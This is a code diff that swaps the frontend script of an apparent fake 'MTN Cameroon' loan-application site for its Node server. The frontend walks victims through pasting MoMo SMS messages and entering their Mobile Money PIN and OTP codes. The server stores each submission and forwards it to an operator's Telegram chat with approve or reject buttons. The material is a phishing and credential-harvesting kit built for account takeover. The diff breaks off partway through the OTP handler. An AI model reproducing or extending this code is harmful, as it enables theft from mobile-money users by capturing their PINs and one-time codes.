@@ -1,944 +1,745 @@
 // ============================================================
-// script.js – Cameroon Version with All Features
+// server.js – Cameroon Version with All Features
 // ============================================================
+console.log("🟢 1. Server is starting...");
+require('dotenv').config();
+console.log("🟢 2. dotenv loaded");
 
-const S = {
-    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
-    firstName: '', lastName: '', phone: '', email: '',
-    employment: '', annualIncome: 0,
-    kinName: '', kinPhone: '',
-    applicationId: '',
-    isSubmitting: false,
-    rejectedStep: null
-};
+const express = require('express');
+const fetch = require('node-fetch');
+const cors = require('cors');
+const path = require('path');
+const fs = require('fs');
 
-let currentPollTimeout = null;
-let otpResendTimer = null;
-let otpResendCountdown = 0;
-let pinBlockTimer = null;
+const app = express();
 
-// ─── localStorage Helpers ───
-const STORAGE_KEYS = {
-    APPLICATION_ID: 'mtn_application_id',
-    APPLICATION_DATA: 'mtn_application_data',
-    REJECTION_INFO: 'mtn_rejection_info',
-    FORM_DRAFT: 'mtn_form_draft',
-    OTP_TIMER: 'mtn_otp_timer'
-};
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, '../frontend')));
 
-function saveToLocalStorage(key, data) {
-    try {
-        localStorage.setItem(key, JSON.stringify(data));
-        console.log(`💾 Saved to localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to save ${key}:`, error);
-    }
+// ─── In-Memory Store ───
+const applications = {};
+const rejectionHistory = {};
+
+const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
+    console.log('Please set these in your .env file or Render environment variables');
 }
 
-function getFromLocalStorage(key) {
-    try {
-        const data = localStorage.getItem(key);
-        return data ? JSON.parse(data) : null;
-    } catch (error) {
-        console.error(`❌ Failed to load ${key}:`, error);
-        return null;
-    }
-}
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+console.log('✅ Server starting...');
 
-function removeFromLocalStorage(key) {
-    try {
-        localStorage.removeItem(key);
-        console.log(`🗑️ Removed from localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to remove ${key}:`, error);
-    }
+// ─── Data Persistence Setup ───
+const DATA_DIR = path.join(__dirname, '../data');
+const DATA_FILE = path.join(DATA_DIR, 'applications.json');
+const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');
+
+if (!fs.existsSync(DATA_DIR)) {
+    fs.mkdirSync(DATA_DIR, { recursive: true });
+    console.log('📁 Created data directory');
 }
 
 // ─── Save/Load Functions ───
-function saveApplicationId(id) {
-    if (id) {
-        S.applicationId = id;
-        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
-            id: id,
+function saveApplications() {
+    try {
+        const data = {
+            applications: applications,
+            rejectionHistory: rejectionHistory,
             timestamp: new Date().toISOString()
-        });
+        };
+        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+        console.log('💾 Applications saved to disk');
+        return true;
+    } catch (error) {
+        console.error('❌ Error saving applications:', error);
+        return false;
     }
 }
 
-function loadApplicationId() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-    if (saved && saved.id) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            S.applicationId = saved.id;
-            console.log(`🔄 Restored application ID: ${saved.id}`);
-            return saved.id;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-        }
-    }
-    return null;
-}
-
-function saveApplicationData() {
-    const dataToSave = {
-        ...S,
-        timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
-}
-
-function loadApplicationData() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            const fieldsToRestore = [
-                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
-                'firstName', 'lastName', 'phone', 'email',
-                'employment', 'annualIncome', 'kinName', 'kinPhone',
-                'applicationId', 'rejectedStep'
-            ];
-            fieldsToRestore.forEach(field => {
-                if (saved[field] !== undefined) {
-                    S[field] = saved[field];
-                }
-            });
-            console.log('🔄 Restored application data from localStorage');
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-        }
-    }
-    return false;
-}
-
-function saveRejectionInfo(step, applicationId) {
-    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
-        step: step,
-        applicationId: applicationId,
-        timestamp: new Date().toISOString()
-    });
-}
-
-function loadRejectionInfo() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 5 * 60 * 1000) {
-            return saved;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-        }
-    }
-    return null;
-}
-
-function clearRejectionInfo() {
-    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-}
-
-function saveFormDraft() {
-    const draft = {
-        firstName: document.getElementById('s2fi')?.value || '',
-        lastName: document.getElementById('s2la')?.value || '',
-        phone: document.getElementById('s2ph')?.value || '',
-        email: document.getElementById('s2em')?.value || '',
-        loanAmount: document.getElementById('s1am')?.value || '',
-        loanPurpose: document.getElementById('s1pu')?.value || '',
-        employment: document.getElementById('s3em')?.value || '',
-        annualIncome: document.getElementById('s3in')?.value || '',
-        kinName: document.getElementById('s3kn')?.value || '',
-        kinPhone: document.getElementById('s3kp')?.value || '',
-        timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
-}
-
-function loadFormDraft() {
-    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-    if (draft) {
-        const age = Date.now() - new Date(draft.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
-            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
-            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
-            if (draft.email) document.getElementById('s2em').value = draft.email;
-            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
-            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
-            if (draft.employment) document.getElementById('s3em').value = draft.employment;
-            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
-            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
-            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
-            console.log('🔄 Restored form draft from localStorage');
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-        }
-    }
-    return false;
-}
-
-// ─── Navigation ───
-function goTo(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    const el = document.getElementById(pageId);
-    if (el) el.classList.add('active');
-    window.scrollTo(0, 0);
-}
-
-function startApplication() {
-    S.rejectedStep = null;
-    clearRejectionInfo();
-    
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    
-    document.getElementById('resendOtpBtn')?.classList.add('hidden');
-    
-    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
-        clearErr(id);
-    });
-    
-    goTo('page-step1');
-}
-
-// ─── Toast Notifications ───
-function showToast(message, type = 'info', duration = 3000) {
-    const existing = document.querySelector('.toast');
-    if (existing) existing.remove();
-    
-    const toast = document.createElement('div');
-    toast.className = `toast toast-${type}`;
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(() => toast.remove(), 300);
-    }, duration);
-}
-
-// ─── Form Helpers ───
-function normalizePhone(id) {
-    let inp = document.getElementById(id);
-    let val = inp.value.replace(/\D/g, '');
-    if (val.length > 9) val = val.substring(0, 9);
-    inp.value = val;
-    saveFormDraft();
-}
-
-function updateCalc() {
-    const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
-    const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
-}
-
-function showErr(id, msg) {
-    const box = document.getElementById(id);
-    if (box) {
-        box.classList.add('show');
-        const txt = document.getElementById(id + 'Txt');
-        if (txt) txt.textContent = msg;
-    }
-}
-
-function clearErr(id) {
-    const box = document.getElementById(id);
-    if (box) box.classList.remove('show');
-}
-
-// ─── Step Navigation ───
-function toS2() {
-    const ty = document.getElementById('s1ty').value;
-    const am = +document.getElementById('s1am').value;
-    const te = document.getElementById('s1te').value;
-    const pu = document.getElementById('s1pu').value;
-    
-    if (!ty || am <= 0 || !te || !pu.trim()) {
-        showErr('s1Err', 'Please complete all fields.');
-        return;
-    }
-    
-    S.loanType = ty; 
-    S.loanAmount = am; 
-    S.loanTerm = te; 
-    S.loanPurpose = pu;
-    
-    saveApplicationData();
-    saveFormDraft();
-    goTo('page-step2');
-}
-
-function toS3() {
-    const fi = document.getElementById('s2fi').value.trim();
-    const la = document.getElementById('s2la').value.trim();
-    const ph = document.getElementById('s2ph').value;
-    const em = document.getElementById('s2em').value.trim();
-    
-    if (!fi || !la) {
-        showErr('s2Err', 'Please enter your full name.');
-        return;
-    }
-    
-    if (ph.length !== 9) {
-        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
-        return;
-    }
-    
-    if (!em || !em.includes('@')) {
-        showErr('s2Err', 'Please enter a valid email address.');
-        return;
-    }
-    
-    S.firstName = fi; 
-    S.lastName = la; 
-    S.phone = ph; 
-    S.email = em;
-    
-    saveApplicationData();
-    saveFormDraft();
-    goTo('page-step3');
-}
-
-// ─── PIN/OTP Helpers ───
-function pinMvM(el, i, maxLength = 5) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < maxLength - 1) {
-        const nextPin = document.getElementById('pin' + (i + 1));
-        if (nextPin) { nextPin.focus(); return; }
-    }
-    
-    if (i === maxLength - 1 && el.value) {
-        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
-        if (allFilled) {
-            setTimeout(() => doPin(), 300);
-        }
-    }
-}
-
-function togPin() {
-    for (let i = 0; i < 5; i++) {
-        const b = document.getElementById('pin' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
-    for (let i = 0; i < 4; i++) {
-        const b = document.getElementById('otp' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
-}
-
-function chkPin() {
-    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
-    const pinBtn = document.querySelector('#page-pin .btn-grad');
-    if (pinBtn) pinBtn.disabled = !pinOk;
-
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-    const otpBtn = document.querySelector('#page-otp .btn-grad');
-    if (otpBtn) otpBtn.disabled = !otpOk;
-}
-
-document.addEventListener('keyup', chkPin);
-
-function clearLoginPin() {
-    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
-    document.getElementById('pin0').focus();
-    chkPin();
-}
-
-function clearOtpCode() {
-    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-    document.getElementById('otp0').focus();
-    chkPin();
-}
-
-function handleOtpInput(el, type) {
-    el.value = el.value.replace(/\D/, '');
-    const idx = parseInt(el.id.match(/\d$/)[0]);
-    if (el.value && type === 'otp' && idx < 3) {
-        document.getElementById('otp' + (idx + 1))?.focus();
-    }
-    chkPin();
-    
-    if (idx === 3 && el.value) {
-        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-        if (allFilled) {
-            setTimeout(() => doOtp(), 300);
-        }
-    }
-}
-
-// ─── PIN Attempt Functions ───
-async function checkPinStatus() {
+function loadApplications() {
     try {
-        const response = await fetch(`/api/pin-status/${S.applicationId}`);
-        const data = await response.json();
-        
-        if (data.ok) {
-            const remaining = data.remainingAttempts || 3;
+        if (fs.existsSync(DATA_FILE)) {
+            const data = fs.readFileSync(DATA_FILE, 'utf8');
+            const parsed = JSON.parse(data);
             
-            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-            if (attemptsDisplay) {
-                if (data.isBlocked) {
-                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
-                    attemptsDisplay.className = 'pin-attempts blocked';
-                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
-                    document.querySelector('#page-pin .btn-grad').disabled = true;
-                    
-                    startPinBlockCountdown(data.blockRemainingSeconds);
-                } else {
-                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
-                    attemptsDisplay.className = 'pin-attempts';
-                }
+            const age = Date.now() - new Date(parsed.timestamp).getTime();
+            if (age < 7 * 24 * 60 * 60 * 1000) {
+                Object.assign(applications, parsed.applications || {});
+                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
+                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
+                return true;
+            } else {
+                console.log('📂 Data file is older than 7 days, starting fresh');
+                const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
+                fs.copyFileSync(DATA_FILE, backupFile);
+                console.log(`📂 Backed up old data to ${backupFile}`);
+                return false;
             }
-            
-            return data;
         }
     } catch (error) {
-        console.error('Error checking PIN status:', error);
-    }
-    return null;
-}
-
-function startPinBlockCountdown(seconds) {
-    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-    if (!attemptsDisplay) return;
-    
-    if (pinBlockTimer) {
-        clearInterval(pinBlockTimer);
-        pinBlockTimer = null;
-    }
-    
-    let remaining = seconds;
-    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-    attemptsDisplay.className = 'pin-attempts blocked';
-    
-    pinBlockTimer = setInterval(() => {
-        remaining--;
-        if (remaining <= 0) {
-            clearInterval(pinBlockTimer);
-            pinBlockTimer = null;
-            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
-            attemptsDisplay.className = 'pin-attempts available';
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
-            document.querySelector('#page-pin .btn-grad').disabled = false;
-            resetPinAttempts();
-        } else {
-            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-        }
-    }, 1000);
-}
-
-async function resetPinAttempts() {
-    try {
-        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, {
-            method: 'POST'
-        });
-    } catch (error) {
-        console.error('Error resetting PIN attempts:', error);
-    }
-}
-
-// ─── OTP Resend Timer ───
-function startOtpResendTimer(seconds = 20) {
-    const btn = document.getElementById('resendOtpBtn');
-    if (!btn) return;
-    
-    if (otpResendTimer) {
-        clearInterval(otpResendTimer);
-        otpResendTimer = null;
-    }
-    
-    otpResendCountdown = seconds;
-    btn.disabled = true;
-    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
-    btn.classList.remove('hidden');
-    
-    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
-        endTime: Date.now() + (seconds * 1000),
-        applicationId: S.applicationId
-    });
-    
-    otpResendTimer = setInterval(() => {
-        otpResendCountdown--;
-        
-        if (otpResendCountdown <= 0) {
-            clearInterval(otpResendTimer);
-            otpResendTimer = null;
-            btn.disabled = false;
-            btn.textContent = '🔄 Resend OTP';
-            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-        } else {
-            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
-        }
-    }, 1000);
-}
-
-function checkOtpTimerRecovery() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
-        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
-        if (remaining > 0) {
-            startOtpResendTimer(remaining);
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-        }
+        console.error('❌ Error loading applications:', error);
     }
     return false;
 }
 
-// ─── Smart Rejection Navigation ───
-function handleRejection(step) {
-    clearErr('s3Err');
-    clearErr('momErr');
-    clearErr('pinErr');
-    clearErr('otpErr');
-    
-    if (currentPollTimeout) {
-        clearTimeout(currentPollTimeout);
-        currentPollTimeout = null;
-    }
-    
-    saveRejectionInfo(step, S.applicationId);
-    
-    switch(step) {
-        case 'sms':
-            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
-            document.getElementById('smsMsgBox').value = '';
-            document.getElementById('smsMsgBox').focus();
-            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected');
-            }, 3000);
-            goTo('page-sms-paste');
-            break;
-            
-        case 'pin':
-            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-            document.getElementById('pin0').focus();
-            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-pin .step-card')?.classList.remove('rejected');
-            }, 3000);
-            checkPinStatus();
-            goTo('page-pin');
-            break;
-            
-        case 'otp':
-            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
-            clearOtpCode();
-            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-otp .step-card')?.classList.remove('rejected');
-            }, 3000);
-            startOtpResendTimer(20);
-            goTo('page-otp');
-            break;
-            
-        default:
-            showToast('❌ Application was rejected. Please start over.', 'error');
-            goTo('page-step1');
+function saveRejectionHistory() {
+    try {
+        fs.writeFileSync(HISTORY_FILE, JSON.stringify(rejectionHistory, null, 2));
+        console.log('💾 Rejection history saved to disk');
+        return true;
+    } catch (error) {
+        console.error('❌ Error saving rejection history:', error);
+        return false;
     }
 }
 
-// ─── Polling ───
-function startPoll(applicationId, step, onSuccess, onReject) {
-    if (currentPollTimeout) {
-        clearTimeout(currentPollTimeout);
-        currentPollTimeout = null;
-    }
-
-    const check = async () => {
-        try {
-            const res = await fetch(`/api/status/${applicationId}/${step}`);
-            const data = await res.json();
-            
-            if (data && data.ok === true) {
-                if (data.status === 'approved') {
-                    currentPollTimeout = null;
-                    onSuccess();
-                    return;
-                } else if (data.status === 'rejected') {
-                    currentPollTimeout = null;
-                    try {
-                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
-                        const redirectData = await redirectRes.json();
-                        
-                        if (redirectData.ok && redirectData.rejectedStep) {
-                            S.rejectedStep = redirectData.rejectedStep;
-                            showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
-                            handleRejection(redirectData.rejectedStep);
-                        } else {
-                            showToast('❌ Application was rejected. Please try again.', 'error');
-                            goTo('page-step3');
-                        }
-                    } catch (err) {
-                        console.error('Error getting rejection info:', err);
-                        showToast('❌ Application was rejected. Please try again.', 'error');
-                        goTo('page-step3');
-                    }
-                    return;
-                }
-            }
-            currentPollTimeout = setTimeout(check, 2000);
-        } catch (err) {
-            console.error('Polling error:', err);
-            currentPollTimeout = setTimeout(check, 3000);
+function loadRejectionHistory() {
+    try {
+        if (fs.existsSync(HISTORY_FILE)) {
+            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
+            const parsed = JSON.parse(data);
+            Object.assign(rejectionHistory, parsed);
+            console.log(`📂 Loaded rejection history from disk`);
+            return true;
         }
-    };
-    check();
+    } catch (error) {
+        console.error('❌ Error loading rejection history:', error);
+    }
+    return false;
 }
 
-// ─── Resend OTP ───
-async function resendOtp() {
-    const btn = document.getElementById('resendOtpBtn');
-    
-    if (otpResendTimer || otpResendCountdown > 0) {
-        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
-        return;
+// ─── Auto-save every 30 seconds ───
+setInterval(() => {
+    if (Object.keys(applications).length > 0) {
+        saveApplications();
+        if (Object.keys(rejectionHistory).length > 0) {
+            saveRejectionHistory();
+        }
     }
+}, 30000);
+
+// ─── Save on shutdown ───
+function gracefulShutdown() {
+    console.log('🔄 Saving data before shutdown...');
+    saveApplications();
+    saveRejectionHistory();
+    process.exit(0);
+}
+
+process.on('SIGINT', gracefulShutdown);
+process.on('SIGTERM', gracefulShutdown);
+
+// ─── Load data on startup ───
+loadApplications();
+loadRejectionHistory();
+
+// ─── Telegram Message Sender ───
+async function sendTelegramMessage(message, buttons = null) {
+    if (!TELEGRAM_BOT_TOKEN) {
+        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
+        return { ok: false, error: 'Bot token missing' };
+    }
+    
+    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+    if (buttons) body.reply_markup = { inline_keyboard: buttons };
     
     try {
-        btn.disabled = true;
-        btn.textContent = '⏳ Sending...';
-        showToast('📤 Requesting new OTP...', 'info');
-        
-        const response = await fetch('/api/resend-otp', {
+        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId })
+            body: JSON.stringify(body)
         });
-        
-        const data = await response.json();
-        
-        if (data.ok) {
-            showToast('✅ New OTP sent to admin for verification!', 'success');
-            startOtpResendTimer(20);
-            
-            startPoll(S.applicationId, 'otp',
-                () => {
-                    showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-                    showApproval();
-                },
-                () => {
-                    handleRejection('otp');
-                }
-            );
-        } else {
-            showToast('❌ Failed to resend OTP. Please try again.', 'error');
-            btn.disabled = false;
-            btn.textContent = '🔄 Resend OTP';
-        }
+        return await response.json();
     } catch (error) {
-        console.error('Resend OTP error:', error);
-        showToast('❌ Failed to resend OTP. Please try again.', 'error');
-        btn.disabled = false;
-        btn.textContent = '🔄 Resend OTP';
+        console.error('Error sending Telegram message:', error);
+        return { ok: false, error: error.message };
     }
 }
 
-// ─── Show Approval ───
-function showApproval() {
-    document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprTerm').textContent = S.loanTerm;
-    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
-    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-    
-    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
-    
-    if (otpResendTimer) {
-        clearInterval(otpResendTimer);
-        otpResendTimer = null;
-    }
-    
-    if (pinBlockTimer) {
-        clearInterval(pinBlockTimer);
-        pinBlockTimer = null;
-    }
-    
-    goTo('page-approval');
-}
-
-// ─── STEP 3: Submit Application ───
-async function submitApp() {
-    const em = document.getElementById('s3em').value;
-    const in_ = +document.getElementById('s3in').value;
-    const kn = document.getElementById('s3kn').value.trim();
-    const kp = document.getElementById('s3kp').value.trim();
-    
-    if (!em || in_ <= 0) {
-        showErr('s3Err', 'Please complete all fields.');
-        return;
-    }
-    
-    S.employment = em; 
-    S.annualIncome = in_; 
-    S.kinName = kn; 
-    S.kinPhone = kp;
-    
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    
-    saveApplicationData();
-    goTo('page-processing');
-
+// ─── 1. Application Submission ───
+app.post('/api/send-application', async (req, res) => {
     try {
-        await fetch('/api/send-application', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationData: S })
-        });
+        const data = req.body.applicationData;
+        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;
+
+        const isResubmission = !!applications[applicationId];
         
-        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
+        applications[applicationId] = { 
+            ...data, 
+            smsStatus: 'pending', 
+            pinStatus: 'pending', 
+            otpStatus: 'pending',
+            pinAttempts: 0,
+            maxPinAttempts: 3,
+            pinBlockedUntil: null,
+            resubmissionCount: isResubmission ? (applications[applicationId]?.resubmissionCount || 0) + 1 : 0,
+            createdAt: isResubmission ? applications[applicationId]?.createdAt : new Date().toISOString(),
+            updatedAt: new Date().toISOString()
+        };
         
-        startPoll(S.applicationId, 'sms',
-            () => { 
-                showToast('✅ SMS Approved!', 'success');
-                goTo('page-sms-paste'); 
-            },
-            () => {
-                handleRejection('sms');
-            }
-        );
-    } catch {
-        showErr('s3Err', 'Failed to submit application.');
-    }
-}
-
-// ─── STEP 4: SMS ───
-async function doSmsParse() {
-    const msg = document.getElementById('smsMsgBox').value.trim();
-    if (msg.length < 3) {
-        showErr('momErr', 'Please paste a valid SMS message.');
-        return;
-    }
-
-    await fetch('/api/send-momo-message', {
-        method: 'POST',
-        body: JSON.stringify({
-            momoData: { 
-                applicationId: S.applicationId, 
-                phone: S.phone, 
-                momoMessage: msg,
-                isResubmission: !!S.rejectedStep
-            }
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-
-    document.getElementById('waitSmsAppId').textContent = S.applicationId;
-    goTo('page-wait-sms');
-
-    startPoll(S.applicationId, 'sms',
-        () => { 
-            showToast('✅ SMS Verified!', 'success');
-            goTo('page-pin'); 
-        },
-        () => {
-            handleRejection('sms');
-        }
-    );
-}
-
-// ─── STEP 5: PIN ───
-async function doPin() {
-    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
-    if (pin.length < 5) {
-        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
-        return;
-    }
-
-    const pinStatus = await checkPinStatus();
-    if (pinStatus && pinStatus.isBlocked) {
-        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
-        return;
-    }
-
-    try {
-        const response = await fetch('/api/send-pin', {
-            method: 'POST',
-            body: JSON.stringify({ 
-                applicationId: S.applicationId, 
-                pin,
-                isResubmission: !!S.rejectedStep
-            }),
-            headers: { 'Content-Type': 'application/json' }
-        });
+        saveApplications();
         
-        const data = await response.json();
+        console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);
+
+        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
         
-        if (!data.ok) {
-            showErr('pinErr', data.error || 'Failed to submit PIN.');
-            return;
-        }
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
+        ]];
 
-        document.getElementById('waitPinAppId').textContent = S.applicationId;
-        goTo('page-wait-pin');
-
-        startPoll(S.applicationId, 'pin',
-            () => { 
-                showToast('✅ PIN Verified!', 'success');
-                resetPinAttempts();
-                goTo('page-otp'); 
-            },
-            async () => {
-                try {
-                    const rejectResponse = await fetch('/api/pin-rejected', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ applicationId: S.applicationId })
-                    });
-                    const rejectData = await rejectResponse.json();
-                    
-                    if (rejectData.blocked) {
-                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
-                        await checkPinStatus();
-                        goTo('page-pin');
-                    } else if (rejectData.remainingAttempts > 0) {
-                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
-                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-                        document.getElementById('pin0').focus();
-                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                        if (attemptsDisplay) {
-                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
-                            attemptsDisplay.className = 'pin-attempts warning';
-                        }
-                        goTo('page-pin');
-                    } else {
-                        handleRejection('pin');
-                    }
-                } catch (err) {
-                    console.error('Error handling PIN rejection:', err);
-                    handleRejection('pin');
-                }
-            }
-        );
+        await sendTelegramMessage(message, buttons);
+        res.json({ ok: true, applicationId, status: 'waiting_sms' });
     } catch (error) {
-        console.error('Error submitting PIN:', error);
-        showErr('pinErr', 'Failed to submit PIN. Please try again.');
-    }
-}
-
-// ─── STEP 6: OTP ───
-async function doOtp() {
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-    if (otp.length < 4) {
-        showErr('otpErr', 'Enter a valid 4-digit OTP.');
-        return;
-    }
-
-    await fetch('/api/send-otp', {
-        method: 'POST',
-        body: JSON.stringify({ 
-            applicationId: S.applicationId, 
-            otp,
-            isResubmission: !!S.rejectedStep
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-
-    document.getElementById('waitOtpAppId').textContent = S.applicationId;
-    goTo('page-wait-otp');
-
-    startPoll(S.applicationId, 'otp',
-        () => {
-            showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-            showApproval();
-        },
-        () => {
